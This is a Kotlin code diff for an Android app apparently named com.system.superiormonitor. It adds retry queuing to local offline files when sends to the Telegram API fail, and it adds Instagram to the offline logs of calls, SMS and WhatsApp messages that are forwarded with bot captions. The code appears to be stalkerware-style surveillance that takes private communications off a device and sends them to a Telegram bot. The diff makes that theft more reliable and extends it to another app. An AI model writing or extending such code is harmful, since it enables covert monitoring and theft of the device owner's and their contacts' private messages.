@@ -49,10 +49,17 @@ object OfflineManager {
         message: String,
         offlineSubdir: String,
         offlineFileName: String,
-        sender: (String, String?) -> Unit
+        sender: (String, String?) -> Boolean
     ) {
         if (com.system.superiormonitor.util.LogManager.isTelegramApiReachable.value) {
-            sender(message, "Markdown")
+            val success = sender(message, "Markdown")
+            if (!success) {
+                val offlineDir = File(context.getExternalFilesDir(null), "$offlineSubdir/offline")
+                if (!offlineDir.exists()) offlineDir.mkdirs()
+                val offlineFile = File(offlineDir, offlineFileName)
+                offlineFile.appendText(message + "\n\n")
+                LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]API unreachable during send. Update queued to $offlineSubdir.")
+            }
         } else {
             val offlineDir = File(context.getExternalFilesDir(null), "$offlineSubdir/offline")
             if (!offlineDir.exists()) offlineDir.mkdirs()
@@ -118,7 +125,8 @@ object OfflineManager {
         val textLogPaths = listOf(
             "call_alrt/offline/offline_calls.txt" to BotMessages.FetchOps.buildOfflineCallLogCaption(),
             "sms_alrt/offline/offline_sms.txt" to BotMessages.FetchOps.buildOfflineSmsLogCaption(),
-            "whatsapp/whatsapp_alrt/offline/offline_whatsapp.txt" to BotMessages.FetchOps.buildOfflineWhatsAppLogCaption()
+            "whatsapp/offline/offline_whatsapp.txt" to BotMessages.FetchOps.buildOfflineWhatsAppLogCaption(),
+            "instagram/offline/offline_instagram.txt" to BotMessages.FetchOps.buildOfflineInstagramLogCaption()
         )
 
         for ((path, caption) in textLogPaths) {
